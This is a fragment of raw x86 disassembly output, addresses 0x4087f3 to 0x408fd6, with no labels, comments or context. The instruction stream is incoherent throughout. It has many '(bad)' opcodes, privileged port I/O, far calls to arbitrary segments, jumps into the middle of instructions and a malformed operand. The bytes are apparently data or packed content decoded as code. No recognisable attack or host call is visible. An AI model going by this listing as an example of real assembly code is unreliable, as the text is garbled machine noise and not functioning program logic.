  4087f3:	mov    ds:0x6c74343f,eax
  4087f8:	jnp    0x408825
  4087fa:	mov    ds:0x66deb9ba,al
  4087ff:	pushf  
  408800:	jae    0x4087da
  408802:	adc    DWORD PTR [ebp+0x53],edi
  408805:	inc    ecx
  408806:	scas   eax,DWORD PTR es:[edi]
  408807:	enter  0x49e9,0x98
  40880b:	dec    esi
  40880c:	pop    edx
  40880d:	(bad)  
  40880e:	retf   
  40880f:	into   
  408810:	mov    esi,0xc38a3688
  408815:	adc    cl,al
  408817:	add    DWORD PTR [ecx+0x39],edx
  40881a:	push   esp
  40881b:	mov    ds:0xa4f2dccf,eax
  408820:	shl    DWORD PTR [ebx],cl
  408822:	sbb    al,0x64
  408824:	out    0x9c,eax
  408826:	push   0x91f7f0e
  40882b:	(bad)  
  40882d:	adc    DWORD PTR [ebx],ebx
  40882f:	sti    
  408830:	cwde   
  408831:	sub    BYTE PTR [edx],dl
  408833:	add    bl,BYTE PTR [eax+0x6d]
  408836:	aaa    
  408837:	jbe    0x40882e
  408839:	adc    eax,0x436b5b03
  40883e:	daa    
  40883f:	fst    DWORD PTR [edx+0x2a]
  408842:	sub    edi,DWORD PTR [ebp-0x1494023a]
  408848:	out    dx,al
  408849:	sbb    DWORD PTR [edi],ebp
  40884b:	fmul   QWORD PTR [edi]
  40884d:	pop    eax
  40884e:	mov    esp,gs
  408850:	fiadd  DWORD PTR [edx]
  408852:	pusha  
  408853:	fdivr  st(5),st
  408855:	fidivr DWORD PTR [esi-0x117abe8f]
  40885b:	cli    
  40885c:	out    dx,eax
  40885d:	ins    BYTE PTR es:[edi],dx
  40885e:	fwait
  40885f:	imul   esi,DWORD PTR [edi+0x416bd3e4],0xffffffcc
  408866:	push   cs
  408867:	out    0x14,eax
  408869:	and    BYTE PTR [edi+ebp*1],ah
  40886c:	cmp    BYTE PTR [esi+0x24a4bd1c],cl
  408872:	or     BYTE PTR [ebx+0x16624634],cl
  408878:	cmp    BYTE PTR [ebx-0x5c],0xb7
  40887c:	cmp    eax,0x7bc1762f
  408881:	popf   
  408882:	pushf  
  408883:	mov    cl,0x36
  408885:	(bad)
  408889:	or     al,0xf6
  40888b:	repnz (bad) 
  40888d:	ins    DWORD PTR es:[edi],dx
  40888e:	out    0xf0,eax
  408890:	adc    DWORD PTR [edi+0x3cc885e4],0x3a
  408897:	mov    BYTE PTR es:[edi+0x46123f96],dh
  40889e:	ret    0x2170
  4088a1:	inc    edi
  4088a2:	pop    ecx
  4088a3:	xor    al,0x1f
  4088a5:	dec    ecx
  4088a6:	pop    eax
  4088a7:	push   ecx
  4088a8:	jp     0x40886b
  4088aa:	jmp    0x4088fd
  4088ac:	jg     0x40892c
  4088ae:	aam    0x20
  4088b0:	ja     0x40891d
  4088b2:	ds cmc 
  4088b4:	ds sbb edi,ebp
  4088b7:	retf   
  4088b8:	mov    al,ds:0xfc3e90c1
  4088bd:	scas   eax,DWORD PTR es:[edi]
  4088be:	lock push 0x7d5b9fa4
  4088c4:	in     eax,0x70
  4088c6:	js     0x408848
  4088c8:	mov    DWORD PTR [ebp-0x61602309],esi
  4088ce:	gs jnp 0x408858
  4088d1:	inc    ecx
  4088d2:	jg     0x4088ca
  4088d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088d5:	cmp    al,0xb4
  4088d7:	sbb    al,0xb8
  4088d9:	call   0xee9d:0x51b3a3c6
  4088e0:	push   cs
  4088e1:	adc    ecx,DWORD PTR [ecx+0x7d]
  4088e4:	xchg   ebp,eax
  4088e5:	repz and eax,0x42de777a
  4088eb:	fdivrp st(1),st
  4088ed:	frstor [eax]
  4088ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088f0:	push   0x7f
  4088f2:	adc    eax,0x5feab8d6
  4088f7:	dec    edx
  4088f8:	inc    edx
  4088f9:	and    al,0x98
  4088fb:	ret    0x51b
  4088fe:	sub    esp,edi
  408900:	sub    ebp,DWORD PTR [edx-0x5015cc02]
  408906:	cs adc eax,0x20b753ee
  40890c:	lock pop ss
  40890e:	mov    ebx,0x4b7d49cd
  408913:	push   ebx
  408914:	add    DWORD PTR [ebp-0x48],0xffffff96
  408918:	dec    esi
  408919:	dec    eax
  40891a:	mov    ebp,0x2f3aa4bb
  40891f:	sub    DWORD PTR [ecx-0x1c1be7b3],edi
  408925:	ss cld 
  408927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408928:	repz add edi,DWORD PTR [ebp-0x1a023848]
  40892f:	out    dx,al
  408930:	mov    ecx,0x73aad645
  408935:	push   edx
  408936:	dec    ebp
  408937:	aam    0x45
  408939:	(bad)  
  40893a:	out    dx,al
  40893b:	icebp  
  40893c:	push   0x5eea2ec2
  408941:	int3   
  408942:	enter  0x1094,0x19
  408946:	retf   
  408947:	xchg   ecx,eax
  408948:	mov    eax,0xa83ad898
  40894d:	cmp    eax,0x5696e746
  408952:	cmp    BYTE PTR [edi+0xb729a89],dl
  408958:	enter  0x5a1a,0x5e
  40895c:	and    bl,al
  40895e:	retf   
  40895f:	shr    al,1
  408961:	outs   dx,BYTE PTR ds:[esi]
  408962:	mov    al,0xf
  408964:	mov    dh,0x88
  408966:	int3   
  408967:	js     0x4089a6
  408969:	es pop esi
  40896b:	rcl    DWORD PTR [eax-0x30],1
  40896e:	mov    esp,0xc6a4f577
  408973:	int3   
  408974:	xchg   BYTE PTR [eax],cl
  408976:	mov    al,0x32
  408978:	jo     0x408941
  40897a:	cli    
  40897b:	repz (bad) 
  40897d:	into   
  40897e:	mov    ah,0xb2
  408980:	leave  
  408981:	clc    
  408982:	aaa    
  408983:	mov    al,0x7b
  408985:	cmp    ecx,ebp
  408987:	in     eax,0xdc
  408989:	nop
  40898a:	mov    ebp,0x839f2939
  40898f:	mov    al,0x16
  408991:	fcomp  QWORD PTR [ebx]
  408993:	push   edx
  408994:	xor    eax,0xba54e31c
  408999:	pusha  
  40899a:	jne    0x408968
  40899c:	cmp    ah,BYTE PTR [esp+edi*1+0x255d0d56]
  4089a3:	shr    BYTE PTR [eax],0x47
  4089a6:	jae    0x408a25
  4089a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089a9:	popa   
  4089aa:	dec    ebp
  4089ab:	or     bl,BYTE PTR [ebx]
  4089ad:	sub    DWORD PTR [ebx-0x2cc31667],0x4d28d2b4
  4089b7:	sbb    eax,0x767f45fd
  4089bc:	(bad)  
  4089bd:	jg     0x4089f6
  4089bf:	cmp    dh,dh
  4089c1:	aam    0x26
  4089c3:	call   0x572f:0x38906fdd
  4089ca:	imul   edx
  4089cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089cd:	int    0x54
  4089cf:	mov    esp,ds
  4089d1:	cmp    ebp,ecx
  4089d3:	imul   eax,DWORD PTR [eax+ebx*1],0x3eaef7ef
  4089da:	addr16 jl 0x4089ea
  4089dd:	push   0x84ac68cd
  4089e2:	sub    ebx,DWORD PTR [esi]
  4089e4:	adc    ecx,DWORD PTR [ebp+0x4bec7b3b]
  4089ea:	add    al,bh
  4089ec:	cmc    
  4089ed:	mov    eax,ds:0x5cd8f5bc
  4089f2:	mov    gs,WORD PTR [eax]
  4089f4:	cmc    
  4089f5:	in     eax,0x36
  4089f7:	inc    ebp
  4089f8:	loope  0x4089a0
  4089fa:	or     esp,ebx
  4089fc:	aad    0x6f
  4089fe:	mov    ebx,0x5cdd7e7f
  408a03:	mul    DWORD PTR [eax]
  408a05:	(bad)  
  408a06:	push   esi
  408a07:	cs push cs
  408a09:	(bad)  
  408a0a:	mov    esi,0xf8e666b3
  408a0f:	sbb    DWORD PTR [esi+0x638e123f],0xffffffb3
  408a16:	xchg   edx,eax
  408a17:	add    BYTE PTR [ebx+0x67],cl
  408a1a:	jecxz  0x408a78
  408a1c:	stos   BYTE PTR es:[edi],al
  408a1d:	nop
  408a1e:	loopne 0x408a0d
  408a20:	jg     0x408a72
  408a22:	dec    eax
  408a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a24:	jno    0x408a2c
  408a26:	mov    ss:0x2f1c2ee0,al
  408a2c:	popa   
  408a2d:	int    0xed
  408a2f:	jae    0x4089d8
  408a31:	pop    es
  408a32:	fs shl dl,0x9a
  408a36:	cs icebp 
  408a38:	fstp   DWORD PTR [ebx-0x1abe1b86]
  408a3e:	aad    0x9
  408a40:	jl     0x4089fe
  408a42:	call   0xefec9b0b
  408a47:	mov    edi,esi
  408a49:	and    al,0x4d
  408a4b:	jecxz  0x408a3e
  408a4d:	daa    
  408a4e:	into   
  408a4f:	mov    DWORD PTR [ecx+eax*8-0x750cba15],ebx
  408a56:	icebp  
  408a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a58:	or     al,0x91
  408a5a:	and    eax,0x627ca713
  408a5f:	loope  0x4089fd
  408a61:	mov    esi,0xa68a0d94
  408a66:	xchg   ebx,eax
  408a67:	test   DWORD PTR [ebp+0x6c],edx
  408a6a:	call   0x34dcefe4
  408a6f:	jg     0x408a07
  408a71:	fs mov ecx,0xe8b19c6e
  408a77:	out    0xbb,eax
  408a79:	jnp    0x408ae2
  408a7b:	push   cs
  408a7c:	call   0xddbc:0x3a13724f
  408a83:	(bad)  
  408a84:	ror    BYTE PTR [edi-0x70fb0822],cl
  408a8a:	mov    al,ds:0x7b071ac4
  408a8f:	jg     0x408a82
  408a91:	popf   
  408a92:	jge    0x408af6
  408a94:	loopne 0x408a39
  408a96:	and    eax,0x55facd12
  408a9b:	adc    BYTE PTR [eax+0x12378c80],dh
  408aa1:	adc    BYTE PTR [eax],0x2f
  408aa4:	adc    cl,BYTE PTR [eax]
  408aa6:	jne    0x408af9
  408aa8:	mov    ds:0xe86e33be,al
  408aad:	cmp    BYTE PTR [ecx-0x2269eccc],0xbb
  408ab4:	cs sbb eax,0x69fabc38
  408aba:	das    
  408abb:	or     cl,bh
  408abd:	aaa    
  408abe:	push   ebx
  408abf:	fs retf 0xc344
  408ac3:	sbb    eax,0x41edf68
  408ac8:	cmp    eax,0x7bfa4497
  408acd:	jmp    0x408a78
  408acf:	mov    ebx,0x6b410e19
  408ad4:	cld    
  408ad5:	jecxz  0x408b45
  408ad7:	jp     0x408ac7
  408ad9:	cmp    al,0x46
  408adb:	aas    
  408adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408add:	or     al,0xe
  408adf:	jno    0x408b08
  408ae1:	je     0x408ab6
  408ae3:	cmp    bh,dh
  408ae5:	sub    DWORD PTR [edx-0x1d],edi
  408ae8:	xchg   edx,eax
  408ae9:	rol    DWORD PTR [esi+ebp*2-0x48757e3],0xc6
  408af1:	sub    DWORD PTR [esi+0x3e474f5c],ebp
  408af7:	mov    DWORD PTR [edx-0xf7c1359],edi
  408afd:	addr16 call 0x4292:0xc3ae98c0
  408b05:	dec    edx
  408b06:	pop    DWORD PTR [esi]
  408b08:	adc    ecx,edi
  408b0a:	xor    eax,0xb8835930
  408b0f:	mov    esi,0x177079b5
  408b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b15:	xor    eax,0x1f2d640e
  408b1a:	sar    BYTE PTR [ecx+0x1d],0x63
  408b1e:	js     0x408b0e
  408b20:	cmp    eax,0x530a0e62
  408b25:	inc    BYTE PTR [eax]
  408b27:	sub    al,BYTE PTR [esi-0x35]
  408b2a:	stos   BYTE PTR es:[edi],al
  408b2b:	pop    ecx
  408b2c:	bound  ebp,QWORD PTR [esi-0x74100013]
  408b32:	or     edx,DWORD PTR [edx-0x7d]
  408b35:	shr    DWORD PTR [eax+0x77],0xa4
  408b39:	xor    ch,cl
  408b3b:	lds    edi,FWORD PTR [ebx]
  408b3d:	cmp    BYTE PTR [edi-0x76ce63ab],0x3a
  408b44:	jl     0x408bc4
  408b46:	and    bl,BYTE PTR [ebp+ecx*2-0x50]
  408b4a:	mov    bl,0xcf
  408b4c:	or     al,0xac
  408b4e:	div    DWORD PTR [ebp-0x62746ffb]
  408b54:	mov    edi,0x62451311
  408b59:	rol    BYTE PTR [ebx+0x2d],0x67
  408b5d:	mov    bl,0xbd
  408b5f:	dec    esp
  408b60:	sub    dh,bl
  408b62:	dec    ebp
  408b63:	sbb    eax,0xfa3a99c5
  408b68:	retfw  
  408b6a:	int3   
  408b6b:	call   0x9b60:0xd4fb5285
  408b72:	inc    ebx
  408b73:	xchg   esp,eax
  408b74:	shr    esi,cl
  408b76:	aad    0x2
  408b78:	shr    BYTE PTR [edx+0x1d],1
  408b7b:	out    0x7b,al
  408b7d:	cmc    
  408b7e:	hlt    
  408b7f:	add    DWORD PTR [ebp+0x6974c86d],esp
  408b85:	cmp    al,0x57
  408b87:	xchg   DWORD PTR [edi-0x647c29ec],edx
  408b8d:	jns    0x408b68
  408b8f:	scas   al,BYTE PTR es:[edi]
  408b90:	jmp    0x5017706c
  408b95:	mov    ah,0x37
  408b97:	xor    bl,dl
  408b99:	mov    bh,0x77
  408b9b:	(bad)  
  408b9c:	scas   al,BYTE PTR es:[edi]
  408b9d:	sbb    dl,bl
  408b9f:	jp     0x408ba0
  408ba1:	cmc    
  408ba2:	jo     0x408c1a
  408ba4:	push   es
  408ba5:	inc    eax
  408ba6:	adc    DWORD PTR [ebx+0x17896c05],esi
  408bac:	mov    ebx,0x5388c8ca
  408bb1:	ds in  eax,0xa9
  408bb4:	push   ebx
  408bb5:	xchg   edi,eax
  408bb6:	jne    0x408c25
  408bb8:	sub    BYTE PTR [esi-0x7e],0xac
  408bbc:	jg     0x408c1c
  408bbe:	imul   esi,ecx,0x45
  408bc1:	leave  
  408bc2:	sti    
  408bc3:	mov    edx,0x90e05511
  408bc8:	(bad)  [edx+0x198b7c15]
  408bce:	inc    esp
  408bcf:	imul   edx,ebx,0xdb523914
  408bd5:	sub    al,0xda
  408bd7:	add    BYTE PTR [esi-0x62],dh
  408bda:	dec    esi
  408bdb:	xchg   esp,eax
  408bdc:	mov    eax,ds:0x1e7e891d
  408be1:	ss aam 0x43
  408be4:	xor    ch,bh
  408be6:	dec    esi
  408be7:	inc    ebx
  408be8:	scas   eax,DWORD PTR es:[edi]
  408be9:	mov    ch,0xf6
  408beb:	bound  ebx,QWORD PTR [edx-0x1300f73f]
  408bf1:	dec    esp
  408bf2:	lahf   
  408bf3:	xchg   esi,eax
  408bf4:	xchg   ecx,eax
  408bf5:	(bad)  [ebp+0x60]
  408bf8:	mov    ds:0x6903ba2b,eax
  408bfd:	pusha  
  408bfe:	and    esi,DWORD PTR [ebx+0x3c]
  408c01:	out    0x17,al
  408c03:	icebp  
  408c04:	jo     0x408b98
  408c06:	int    0xed
  408c08:	xchg   ebx,eax
  408c09:	xchg   dx,ax
  408c0b:	lods   al,BYTE PTR ds:[esi]
  408c0c:	mov    edi,0x1841a434
  408c11:	aaa    
  408c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c13:	sub    al,BYTE PTR [eax-0x17f7facf]
  408c19:	add    DWORD PTR [edx+0x36],ebx
  408c1c:	lahf   
  408c1d:	std    
  408c1e:	sub    al,0x1a
  408c20:	add    ch,BYTE PTR [ebx-0x66061b70]
  408c26:	icebp  
  408c27:	add    al,0x75
  408c29:	imul   eax,DWORD PTR [edi],0x30c609f0
  408c2f:	push   ecx
  408c30:	mov    bl,0x79
  408c32:	inc    ecx
  408c33:	das    
  408c34:	or     BYTE PTR [ebx+0x34],dh
  408c37:	pop    edi
  408c38:	or     BYTE PTR [ebx+eiz*4+0x2c8c7758],cl
  408c3f:	mov    ebp,DWORD PTR [edi-0x602d4178]
  408c45:	xor    BYTE PTR [ebp+eiz*4-0x11],al
  408c49:	scas   eax,DWORD PTR es:[edi]
  408c4a:	hlt    
  408c4b:	aaa    
  408c4c:	clc    
  408c4d:	xchg   edi,eax
  408c4e:	xchg   ebx,eax
  408c4f:	push   ebx
  408c50:	dec    eax
  408c51:	comiss xmm0,DWORD PTR ds:0xd574ee48
  408c58:	fcmovu st,st(2)
  408c5a:	shrd   DWORD PTR [eax+ebp*2-0x29085b01],ebp,cl
  408c62:	push   cs
  408c63:	xchg   bl,dh
  408c65:	mov    ch,0x75
  408c67:	ins    BYTE PTR es:[edi],dx
  408c68:	add    dh,BYTE PTR [edi-0x70]
  408c6b:	jo     0x408c19
  408c6d:	xor    al,0x25
  408c6f:	sbb    BYTE PTR [edi+0x5e],0x79
  408c73:	mov    al,ds:0xfb643fba
  408c78:	add    ax,0xa2bb
  408c7c:	push   ss
  408c7d:	inc    ecx
  408c7e:	lods   al,BYTE PTR ds:[esi]
  408c7f:	jle    0x408c7d
  408c81:	and    ecx,DWORD PTR [edx+ebp*2]
  408c84:	sub    ch,cl
  408c86:	sub    edx,edi
  408c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c89:	out    dx,al
  408c8a:	into   
  408c8b:	mov    cl,0x9d
  408c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c8e:	fnstsw WORD PTR [ebp+esi*4+0x22]
  408c92:	pop    edx
  408c93:	imul   ebp,esi,0x48
  408c96:	xor    DWORD PTR [edx+0x5f],esp
  408c99:	inc    esp
  408c9a:	add    BYTE PTR [eax-0x1695139f],ah
  408ca0:	inc    eax
  408ca1:	daa    
  408ca2:	and    eax,0xd577d077
  408ca7:	push   0xeac94020
  408cac:	mov    ds:0x7a24d4e7,al
  408cb1:	or     al,0x84
  408cb3:	or     DWORD PTR [ebx+0xb139865],ebp
  408cb9:	imul   esi,DWORD PTR [ebx+edx*4-0x2eab1f37],0x11
  408cc1:	or     eax,0xa6cf6019
  408cc6:	pop    ecx
  408cc7:	pop    ecx
  408cc8:	jne    0x408c96
  408cca:	cli    
  408ccb:	mov    ds:0x51da58f3,eax
  408cd0:	and    BYTE PTR [ebx-0x3647d31c],0x3
  408cd7:	das    
  408cd8:	pusha  
  408cd9:	jg     0x408d15
  408cdb:	adc    ebp,DWORD PTR [esi+0x247733d9]
  408ce1:	mov    eax,DWORD PTR [edx-0xe2014b0]
  408ce7:	inc    esi
  408ce8:	jne    0x408d12
  408cea:	fucom  st(7)
  408cec:	and    ebx,ebp
  408cee:	imul   esi,DWORD PTR [edi-0x461f496b],0xfffffff2
  408cf5:	jmp    0x408cc3
  408cf7:	das    
  408cf8:	pop    eax
  408cf9:	dec    ebx
  408cfa:	sbb    al,0x58
  408cfc:	fst    DWORD PTR [ebx]
  408cfe:	hlt    
  408cff:	jge    0x408c8b
  408d01:	push   edi
  408d02:	mov    DWORD PTR [ecx+0x48],edx
  408d05:	sub    al,0xb9
  408d07:	jae    0x408cd0
  408d09:	imul   eax,DWORD PTR [edx],0x3b
  408d0c:	std    
  408d0d:	jecxz  0x408d3e
  408d0f:	push   0x5fb1941a
  408d14:	cmp    BYTE PTR [eax],bl
  408d16:	mov    es,esi
  408d18:	stos   BYTE PTR es:[edi],al
  408d19:	mov    eax,ds:0xd6062e9
  408d1e:	mov    ds:0xd8aa649a,eax
  408d23:	inc    ebx
  408d24:	aas    
  408d25:	cmp    eax,0x1cf49dd7
  408d2a:	mov    ch,0x21
  408d2c:	pusha  
  408d2d:	add    al,0xd9
  408d2f:	addr16 into 
  408d31:	call   0x63281c6e
  408d36:	out    0x84,al
  408d38:	cmp    eax,0x5800d42b
  408d3d:	pop    ebp
  408d3e:	jmp    0x408d1b
  408d40:	sbb    eax,0xa5854587
  408d45:	addr16 ins DWORD PTR es:[di],dx
  408d48:	loope  0x408d56
  408d4a:	sbb    ebx,DWORD PTR [ebx+0x6d74aa6e]
  408d50:	or     DWORD PTR [ecx+edx*8],0x2d8c5b20
  408d57:	or     dl,BYTE PTR [ecx-0xc2355a7]
  408d5d:	add    dh,BYTE PTR gs:[esi]
  408d60:	rol    BYTE PTR [ebx-0x2b9eba0c],1
  408d66:	push   ebp
  408d67:	pop    ds
  408d68:	cs add al,0x23
  408d6b:	stos   DWORD PTR es:[edi],eax
  408d6c:	jge    0x408ddc
  408d6e:	(bad)  ss:[ebx]
  408d71:	daa    
  408d72:	pop    eax
  408d73:	push   cs
  408d74:	cmp    eax,0xad6e632a
  408d79:	lahf   
  408d7a:	add    ecx,ebx
  408d7c:	mov    DWORD PTR [ebx+0x17],esp
  408d7f:	mov    ecx,0xb430d475
  408d84:	or     eax,0x23050597
  408d89:	xlat   BYTE PTR ds:[ebx]
  408d8a:	add    BYTE PTR [eiz*4-0x7b8a7571],bl
  408d91:	imul   ebx,DWORD PTR [ebp+0x6fa012a],0xf79308e5
  408d9b:	and    al,BYTE PTR [esi]
  408d9d:	sti    
  408d9e:	je     0x408d38
  408da0:	add    al,0xa4
  408da2:	mov    eax,0x438d9c28
  408da7:	xor    BYTE PTR [ebx-0x69],0x82
  408dab:	dec    ecx
  408dac:	push   eax
  408dad:	imul   dl
  408daf:	mov    ds:0xd1e3b251,eax
  408db4:	sbb    eax,0x611ed6c5
  408db9:	pop    ebx
  408dba:	xchg   ebp,eax
  408dbb:	push   esi
  408dbc:	test   eax,0xdcc740aa
  408dc1:	and    BYTE PTR [esi+0x4e7ae087],cl
  408dc7:	dec    ebp
  408dc8:	ja     0x408dcc
  408dca:	mov    DWORD PTR [ebx],0x4e48f3a6
  408dd0:	daa    
  408dd1:	scas   al,BYTE PTR es:[edi]
  408dd2:	aam    0x32
  408dd4:	add    ch,bh
  408dd6:	dec    ebx
  408dd7:	sub    cl,BYTE PTR [ecx+0x64]
  408dda:	in     al,dx
  408ddb:	stos   DWORD PTR es:[edi],eax
  408ddc:	nop
  408ddd:	inc    edx
  408dde:	loopne 0x408e26
  408de0:	hlt    
  408de1:	or     BYTE PTR [bp+di-0x2],cl
  408de5:	stc    
  408de6:	je     0x408d82
  408de8:	lods   eax,DWORD PTR ds:[esi]
  408de9:	inc    esp
  408dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408deb:	icebp  
  408dec:	or     bh,0xd1
  408def:	sub    BYTE PTR [ebx],0x8c
  408df2:	rcr    DWORD PTR [ecx-0x76e390b3],0xb3
  408df9:	jg     0x408d81
  408dfb:	(bad)  
  408dfd:	push   eax
  408dfe:	pop    esi
  408dff:	jge    0x408e07
  408e01:	outs   dx,DWORD PTR ds:[esi]
  408e02:	xchg   edx,eax
  408e03:	(bad)  
  408e04:	sub    al,0x36
  408e06:	das    
  408e07:	mov    ah,0xee
  408e09:	lahf   
  408e0a:	jge    0x408e2b
  408e0c:	pop    esi
  408e0d:	mov    ds,WORD PTR [esi-0x71f3c93]
  408e13:	in     eax,dx
  408e14:	(bad)  [edx]
  408e16:	leave  
  408e17:	(bad)  
  408e18:	std    
  408e19:	aad    0x1f
  408e1b:	sub    al,BYTE PTR [ebx+0x1f]
  408e1e:	dec    esp
  408e1f:	xor    edx,DWORD PTR [esi-0x2c]
  408e22:	fsub   DWORD PTR [esi]
  408e24:	push   edi
  408e25:	stos   BYTE PTR es:[edi],al
  408e26:	sbb    BYTE PTR [edx],al
  408e28:	jnp    0x408e72
  408e2a:	push   ebp
  408e2b:	or     ebx,ecx
  408e2d:	mov    ebx,ecx
  408e2f:	mov    edi,DWORD PTR ds:0xff209fdc
  408e35:	push   edx
  408e36:	(bad)  
  408e38:	sub    eax,0x16dd3329
  408e3d:	and    DWORD PTR [edi+esi*8+0x34],0x62
  408e42:	push   0x3b1399c6
  408e47:	xchg   esi,eax
  408e48:	pop    ds
  408e49:	mov    ds,WORD PTR [ebx-0x437f8284]
  408e4f:	push   cs
  408e50:	and    edx,DWORD PTR [ebx-0x6c76a5e8]
  408e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e57:	fist   DWORD PTR [ebp+0x5b]
  408e5a:	(bad)  
  408e5b:	mov    ds:0x105c89ee,al
  408e60:	inc    ebx
  408e61:	mov    ?,WORD PTR [ebx-0x2]
  408e64:	out    dx,al
  408e65:	inc    edx
  408e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e67:	je     0x408e04
  408e69:	in     al,dx
  408e6a:	daa    
  408e6b:	ins    DWORD PTR es:[edi],dx
  408e6c:	es ds scas eax,DWORD PTR es:[edi]
  408e6f:	js     0x408e27
  408e71:	mov    ds:0x50b817eb,eax
  408e76:	adc    cl,al
  408e78:	aad    0xce
  408e7a:	mov    WORD PTR [ebx+ebp*4-0x259b9bc1],es
  408e81:	in     al,dx
  408e82:	add    DWORD PTR [edx+0x6b],eax
  408e85:	fcomp  QWORD PTR [ecx-0xe]
  408e88:	cmp    dh,BYTE PTR [esi+0x648b0000]
  408e8e:	in     al,0x61
  408e90:	test   BYTE PTR [esp+eax*8+0x6b597cba],bh
  408e97:	mul    DWORD PTR [edx+eax*4]
  408e9a:	call   0x6e14:0x41860e0b
  408ea1:	mov    ds:0x6af85a7c,eax
  408ea6:	shl    DWORD PTR ds:0x5ce03b1d,cl
  408eac:	out    dx,eax
  408ead:	paddusw mm0,QWORD PTR [edx+eax*4-0x22]
  408eb2:	cwde   
  408eb3:	std    
  408eb4:	jg     0x408efb
  408eb6:	sbb    BYTE PTR [ecx-0x7eee3935],ah
  408ebc:	in     al,0xc7
  408ebe:	lea    esi,[ecx-0x5e]
  408ec1:	or     esi,DWORD PTR [eax]
  408ec3:	out    dx,al
  408ec4:	xchg   DWORD PTR [ecx-0x35],eax
  408ec7:	push   es
  408ec8:	out    dx,al
  408ec9:	pop    ebx
  408eca:	das    
  408ecb:	sbb    BYTE PTR [esi+edi*2-0x7f],ch
  408ecf:	frstor [eax+0x4c]
  408ed2:	in     al,dx
  408ed3:	push   cs
  408ed4:	cmc    
  408ed5:	mov    BYTE PTR [esi],al
  408ed7:	fbld   TBYTE PTR [edi-0x7]
  408eda:	jnp    0x408efc
  408edc:	and    eax,0xcadccecb
  408ee1:	sub    BYTE PTR [ebp-0x5b066248],dh
  408ee7:	mov    al,0x4a
  408ee9:	leave  
  408eea:	mov    ch,0x50
  408eec:	les    esp,FWORD PTR [esi+ebx*1]
  408eef:	pusha  
  408ef0:	push   esi
  408ef1:	sbb    al,0xb2
  408ef3:	sahf   
  408ef4:	xchg   esp,eax
  408ef5:	xor    al,0xe6
  408ef7:	loope  0x408ee6
  408ef9:	or     ebp,DWORD PTR [edi-0x32dfaa83]
  408eff:	cmp    al,0x63
  408f01:	inc    ebx
  408f02:	ins    DWORD PTR es:[edi],dx
  408f03:	add    DWORD PTR [edx],eax
  408f05:	outs   dx,BYTE PTR ds:[esi]
  408f06:	adc    al,0xba
  408f08:	pushf  
  408f09:	mov    eax,ds:0x279f0799
  408f0e:	mov    edi,0xfc9dd460
  408f13:	leave  
  408f14:	inc    ecx
  408f15:	sub    bh,BYTE PTR [edx+0x2c587c32]
  408f1b:	sbb    ah,BYTE PTR [edi+ebx*2-0x2d8b5e12]
  408f22:	fisubr DWORD PTR [esi+eax*1+0x7e]
  408f26:	xchg   esi,eax
  408f27:	sahf   
  408f28:	jno    0x408ebb
  408f2a:	call   0x2b01:0xdbca22a2
  408f31:	xor    bh,BYTE PTR [ecx+0x5b087e96]
  408f37:	adc    al,0xb1
  408f39:	and    BYTE PTR ss:[edx-0x6f],bh
  408f3d:	mov    ds,WORD PTR [eax-0x70]
  408f40:	pop    ebp
  408f41:	aam    0xef
  408f43:	jno    0x408ec9
  408f45:	cli    
  408f46:	add    DWORD PTR [edi],ecx
  408f48:	mov    bl,0x87
  408f4a:	cmp    edi,DWORD PTR [ebp+0x93a003d]
  408f50:	fs inc esp
  408f52:	sbb    esp,DWORD PTR [edi]
  408f54:	add    esi,esp
  408f56:	dec    ebp
  408f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f58:	push   0xffffffcf
  408f5a:	jns    0x408f14
  408f5c:	inc    edi
  408f5d:	add    eax,0x21867f6c
  408f62:	dec    esi
  408f63:	fisttp QWORD PTR [eax]
  408f65:	jae    0x408eeb
  408f67:	or     DWORD PTR es:[eax-0xa],0xffffffdf
  408f6c:	adc    al,0x74
  408f6e:	dec    edi
  408f6f:	mov    eax,ds:0x13baead9
  408f74:	js     0x408f9c
  408f76:	mov    eax,0x2a61714e
  408f7b:	repnz aam 0x3f
  408f7e:	jecxz  0x408fda
  408f80:	add    DWORD PTR [esi+0x55],ebp
  408f83:	outs   dx,DWORD PTR ds:[esi]
  408f84:	xor    bh,BYTE PTR [ecx+0x6d]
  408f87:	inc    ebx
  408f88:	call   0x85be7d5b
  408f8d:	cdq    
  408f8e:	test   ebp,edi
  408f90:	cmp    dl,ah
  408f92:	cmp    esp,esi
  408f94:	jae    0x408fd0
  408f96:	fnsave [edx+ebx*4-0x9]
  408f9a:	outs   dx,BYTE PTR ds:[esi]
  408f9b:	stc    
  408f9c:	or     ebx,edx
  408f9e:	pop    edx
  408f9f:	inc    esp
  408fa0:	sbb    BYTE PTR [esi+0x1d],dl
  408fa3:	adc    eax,0x58cd20d
  408fa8:	push   ss
  408fa9:	push   esp
  408faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fab:	in     al,dx
  408fac:	pop    eax
  408fad:	pop    edi
  408fae:	in     eax,0x61
  408fb0:	cwde   
  408fb1:	mov    edi,DWORD PTR ds:0xba0d6121
  408fb7:	sub    esp,esp
  408fb9:	ja     0x409005
  408fbb:	test   BYTE PTR [esi-0x7e],dh
  408fbe:	and    DWORD PTR [edi],ebp
  408fc0:	retf   
  408fc1:	fldcw  WORD PTR [edx+eax*8]
  408fc4:	cmp    al,0x13
  408fc6:	pop    edx
  408fc7:	out    dx,al
  408fc8:	mov    bh,BYTE PTR [esi]
  408fca:	or     ecx,esp
  408fcc:	mov    eax,ds:0xb5abf964
  408fd1:	or     BYTE PTR [esp],al
  408fd4:	push   ss
  408fd5:	xlat   BYTE PTR ds:[ebx]
  408fd6:	cld    
